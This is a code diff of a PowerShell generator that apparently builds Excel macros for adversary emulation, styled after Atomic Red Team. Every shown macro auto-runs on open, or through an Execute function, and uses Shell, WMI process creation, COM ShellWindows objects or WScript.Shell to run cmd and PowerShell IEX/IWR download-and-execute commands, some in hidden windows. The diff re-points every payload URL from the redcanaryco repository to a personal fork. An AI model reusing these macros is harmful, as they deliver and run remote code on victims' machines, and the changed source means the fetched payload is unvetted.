@@ -66,7 +66,7 @@ function Excel-Shell {
 
 $Code = @"
 Sub Auto_Open()
-    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
+    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
 End Sub
 "@
 
@@ -124,7 +124,7 @@ Sub Auto_Open()
     Set objConfig = objStartup.SpawnInstance_
     objConfig.ShowWindow = HIDDEN_WINDOW
     Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
-    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID
+    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID
 End Sub
 "@
 
@@ -182,7 +182,7 @@ Sub Auto_Open()
     Set objConfig = objStartup.SpawnInstance_
     objConfig.ShowWindow = HIDDEN_WINDOW
     Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
-    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID
+    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID
 End Sub
 "@
 
@@ -236,7 +236,7 @@ Sub Auto_Open()
     Const ShellWindows = _
     "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
     Set SW = GetObject("new:" & ShellWindows).Item()
-    SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
+    SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
 End Sub
 "@
 
@@ -290,7 +290,7 @@ Sub Auto_Open()
     Const ShellBrowserWindow = _
     "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"
     Set SBW = GetObject("new:" & ShellBrowserWindow)
-    SBW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
+    SBW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
 End Sub
 "@
 
@@ -342,7 +342,7 @@ function Excel-Com-wshshell {
 $Code = @"
 Sub Auto_Open()
     Set WshShell = CreateObject("WScript.Shell")
-    Set WshShellExec = WshShell.Exec("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')")
+    Set WshShellExec = WshShell.Exec("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')")
 End Sub
 "@
 
@@ -400,7 +400,7 @@ C2
 End Sub
 
 Public Function Execute() As Variant
-    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
+    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
 End Function
 
 Public Function C2() As Variant
@@ -467,7 +467,7 @@ C2
 End Sub
 
 Public Function Execute() As Variant
-    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
+    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
 End Function
 
 Public Function C2() As Variant
